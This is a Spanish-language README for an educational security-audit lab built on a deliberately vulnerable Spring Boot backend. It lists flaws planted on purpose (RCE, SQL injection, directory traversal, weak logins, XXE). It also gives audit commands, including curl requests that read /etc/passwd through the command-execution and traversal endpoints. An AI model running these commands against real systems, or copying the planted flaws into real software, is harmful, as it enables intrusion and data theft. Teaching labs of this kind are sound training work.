# PROYECTO DE AUDITORÍA INFORMÁTICA - BACKEND VULNERABLE

## ⚠️ ADVERTENCIA IMPORTANTE
**Este proyecto contiene vulnerabilidades intencionales para fines educativos únicamente. NUNCA usar en producción.**

---

## OBJETIVO DEL PROYECTO

Este backend Spring Boot ha sido modificado para incluir múltiples vulnerabilidades de seguridad que pueden ser detectadas y explotadas usando herramientas de auditoría informática estándar como Nmap, Nessus, OpenVAS, Metasploit, etc.

## VULNERABILIDADES IMPLEMENTADAS

### 1. **Information Disclosure** (Crítico)
- **Endpoint**: `/debug/server-info`
- **Herramientas**: Nmap, Nessus, navegador web
- **Descripción**: Expone información detallada del sistema

### 2. **Remote Code Execution - RCE** (Crítico)
- **Endpoint**: `/admin/execute?cmd=COMMAND`
- **Herramientas**: Metasploit, curl, scripts personalizados
- **Descripción**: Permite ejecutar comandos del sistema operativo

### 3. **SQL Injection** (Alto)
- **Endpoint**: `/admin/user/{id}`
- **Herramientas**: SQLMap, Burp Suite
- **Descripción**: Inyección SQL sin parámetros preparados

### 4. **Directory Traversal** (Alto)
- **Endpoint**: `/admin/file?filename=PATH`
- **Herramientas**: Burp Suite, scripts personalizados
- **Descripción**: Acceso a archivos fuera del directorio web

### 5. **Sensitive Data Exposure** (Crítico)
- **Endpoint**: `/config/database`
- **Herramientas**: Navegador web, curl
- **Descripción**: Expone credenciales y API keys

### 6. **CORS Misconfiguration** (Medio)
- **Configuración**: `Access-Control-Allow-Origin: *`
- **Herramientas**: Herramientas de desarrollo web
- **Descripción**: Permite ataques desde cualquier origen

### 7. **Weak Authentication** (Alto)
- **Endpoint**: `/admin/login`
- **Credenciales**: admin/admin, guest/guest
- **Herramientas**: Hydra, Burp Suite
- **Descripción**: Credenciales débiles y predecibles

### 8. **Backup Files Exposure** (Alto)
- **Endpoints**: `/backup/database.sql`, `/backup/config.bak`, `/backup/users.csv`
- **Herramientas**: Gobuster, Dirb, Dirbuster
- **Descripción**: Archivos de backup públicamente accesibles

### 9. **Unrestricted File Upload** (Alto)
- **Endpoint**: `/admin/upload`
- **Herramientas**: Burp Suite, curl
- **Descripción**: Subida de archivos sin validación

### 10. **XML External Entity (XXE)** (Alto)
- **Endpoint**: `/admin/xml`
- **Herramientas**: Burp Suite, scripts personalizados
- **Descripción**: Procesamiento XML vulnerable

---

## INSTRUCCIONES PARA LA AUDITORÍA

### PREREQUISITOS
- Parrot Security OS o Kali Linux
- Herramientas instaladas: nmap, gobuster, dirb, nikto, sqlmap, metasploit

### FASE 1: RECONOCIMIENTO
```bash
# Information gathering
nmap -sS -sV -O tu-app.koyeb.app
whois tu-app.koyeb.app
```

### FASE 2: EXPLORACIÓN
```bash
# Port scanning
nmap -p 80,443,8080,8443 -sV tu-app.koyeb.app

# Vulnerability scanning
nessus -T html tu-app.koyeb.app
```

### FASE 3: ENUMERACIÓN
```bash
# Directory enumeration
gobuster dir -u https://tu-app.koyeb.app -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# File enumeration
dirb https://tu-app.koyeb.app /usr/share/wordlists/dirb/common.txt
```

### FASE 4: OBTENCIÓN DE ACCESO
```bash
# Information disclosure
curl https://tu-app.koyeb.app/debug/server-info

# RCE exploitation
curl "https://tu-app.koyeb.app/admin/execute?cmd=whoami"
curl "https://tu-app.koyeb.app/admin/execute?cmd=cat /etc/passwd"

# SQL injection
sqlmap -u "https://tu-app.koyeb.app/admin/user/1" --dbs --batch

# Directory traversal
curl "https://tu-app.koyeb.app/admin/file?filename=../../../etc/passwd"

# Backup files access
curl https://tu-app.koyeb.app/backup/database.sql
curl https://tu-app.koyeb.app/backup/config.bak
curl https://tu-app.koyeb.app/backup/users.csv

# Weak authentication
curl -X POST -d "username=admin&password=admin" https://tu-app.koyeb.app/admin/login
```

### FASE 5: ANÁLISIS CON HERRAMIENTAS ESPECIALIZADAS
```bash
# Nikto web scanner
nikto -h https://tu-app.koyeb.app

# Comprehensive analysis
nessus_scan tu-app.koyeb.app
openvas_scan tu-app.koyeb.app
```

---

## COMANDOS ESPECÍFICOS SEGÚN HERRAMIENTAS REQUERIDAS

### theHarvester
```bash
theHarvester -d tu-dominio.com -b google
```

### Maltego
- Import domain: tu-dominio.com
- Run standard transforms
- Analyze infrastructure

### Nmap (Obligatorio)
```bash
nmap -sS -sV -O -p- tu-app.koyeb.app
nmap --script vuln tu-app.koyeb.app
```

### Nessus (Obligatorio)
1. Abrir Nessus Web UI
2. New Scan → Basic Network Scan
3. Target: tu-app.koyeb.app
4. Launch scan

### OpenVAS (Obligatorio)
1. Abrir GVM/OpenVAS
2. Create Task → tu-app.koyeb.app
3. Run Full and fast scan

### Gobuster (Obligatorio)
```bash
gobuster dir -u https://tu-app.koyeb.app -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,sql,csv
```

### Metasploit (Obligatorio)
```bash
msfconsole
search http
use auxiliary/scanner/http/http_version
set RHOSTS tu-app.koyeb.app
run
```

---

## RESULTADOS ESPERADOS

### Nmap
- Detección de puertos abiertos (80, 443)
- Identificación de servicios (HTTP, Spring Boot)
- Banner grabbing con información del servidor

### Gobuster/Dirb
- Descubrimiento de directorios: /admin, /debug, /config, /backup
- Archivos sensibles: database.sql, config.bak, users.csv

### Nessus/OpenVAS
- CVE relacionados con Spring Boot
- Configuración CORS insegura
- Headers de seguridad faltantes
- Exposición de información sensible

### SQLMap
- Detección de SQL injection en /admin/user/
- Extracción de información de la base de datos

### Metasploit
- Módulos aplicables para Spring Boot
- Exploits para RCE

---

## DOCUMENTACIÓN PARA EL INFORME

### Evidencias a Capturar
1. **Screenshots** de cada herramienta ejecutándose
2. **Logs** de comandos y resultados
3. **Reportes** de Nessus y OpenVAS
4. **Capturas** de exploits exitosos
5. **Archivos** sensibles obtenidos

### Matriz de Riesgos (CVSS)
- **Crítico**: RCE, Sensitive Data Exposure
- **Alto**: SQL Injection, Directory Traversal, File Upload
- **Medio**: CORS Misconfiguration, Information Disclosure
- **Bajo**: Headers de seguridad faltantes

### Recomendaciones de Mitigación
1. Deshabilitar endpoints de debug
2. Implementar autenticación robusta
3. Usar consultas preparadas
4. Validar entrada de usuarios
5. Configurar CORS restrictivo
6. Eliminar archivos de backup
7. Implementar headers de seguridad

---

## SCRIPT DE DEMOSTRACIÓN

Ejecuta el script incluido para una demostración completa:
```bash
chmod +x demo_auditoria.sh
./demo_auditoria.sh
```

---

## RESTAURACIÓN DE SEGURIDAD

Después de completar la auditoría, restaura la configuración segura:

1. Revertir cambios en `SegurityConfig.java`
2. Eliminar `VulnerableController.java`
3. Eliminar archivos de backup del directorio static
4. Activar configuración de producción

---

## NOTAS IMPORTANTES

- **Solo para uso académico**: Estas vulnerabilidades son solo para demostración
- **Documentar todo**: Captura evidencias de cada paso
- **Usar responsablemente**: No atacar sistemas sin autorización
- **Reportar hallazgos**: Generar informe profesional con recomendaciones

---

## CONTACTO

Para dudas sobre la implementación o el proyecto de auditoría, contacta al equipo de desarrollo.

**Recuerda**: Este es un entorno controlado para aprendizaje. Siempre obtén autorización antes de realizar pruebas de penetración en sistemas reales.
